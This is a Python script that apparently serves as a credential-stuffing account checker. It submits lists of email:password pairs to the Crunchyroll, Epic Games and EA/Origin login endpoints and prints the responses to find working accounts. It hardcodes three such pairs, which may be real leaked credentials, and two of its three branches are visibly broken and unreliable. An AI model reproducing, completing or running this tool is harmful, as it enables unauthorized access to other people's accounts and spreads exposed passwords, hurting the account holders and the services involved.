import requests, urllib, sys, base64
from utils import cprint

test_accounts = ["HalloWelt@gmail.com:123ABCDEFG","mutinyp2@gmail.com:spell4564!!", "mutinyp2@gmail.com:Lukas1902101992"]

def checker(clist: list):
    urls = ["https://www.crunchyroll.com/de/login", "https://www.epicgames.com/id/api/login", "https://signin.ea.com/p/originX/login?execution=e1390309168s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Dde_DE%26client_id%3DORIGIN_SPA_ID"]
    jesus = ["Crunchyroll", "Epic Games", "UPlay"]
    cprint(f"[1] {jesus[0]}\n[2] {jesus[1]} \n", "green")
    s = int(input("Enter Number for URL: "))
    if s == 1:
        for combo in clist: #Broken
            account = combo.replace("\n", "")
            a = account.split(":")
            user = a[0]
            pwd = a[1]
            payload = {
                "login_form[name]": user,
                "login_form[password]": pwd,
                "login_form[redirect_url]": "/de"
            }
            with requests.Session() as s2:
                p = s2.post(urls[0], data=payload)
                print(p.status_code)
    elif s == 2: #Broken
        for combo in clist:
            account = combo.replace("\n", "")
            a = account.split(":")
            user = a[0]
            pwd = a[1]
            with requests.Session() as s2:
                if "csrftoken" in s2.cookies:
                    csrftoken = s2.cookies['csrftoken']
                else:
                    csrftoken = s2.cookies['csrf']
                login_data = dict(email=user, password=pwd, )
                p = s2.post(urls[1], data=payload)
                print(p.text)
    elif s == 3:
        for combo in clist:
            account = combo.replace("\n", "")
            a = account.split(":")
            user = a[0]
            pwd = a[1]
            payload = {
                "email": user,
                "password": pwd,
                "_rememberMe": "off",
                "rememberMe": "off"
            }
            with requests.Session() as s1:
                p = s1.post(urls[2], data=payload)
                print(p.text)
checker(test_accounts)